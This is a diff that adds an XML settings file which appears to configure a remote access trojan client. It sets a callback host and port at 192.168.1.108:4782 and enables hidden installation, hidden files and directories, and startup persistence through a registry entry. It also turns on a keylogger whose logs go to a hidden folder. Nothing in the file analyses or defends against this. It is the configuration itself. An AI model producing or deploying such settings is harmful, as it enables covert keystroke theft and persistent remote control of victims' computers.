@@ -1,0 +1,38 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>192.168.1.108:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>0f18078a-7027-4dd4-b355-629d36582f30</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>Client</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Client Startup</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
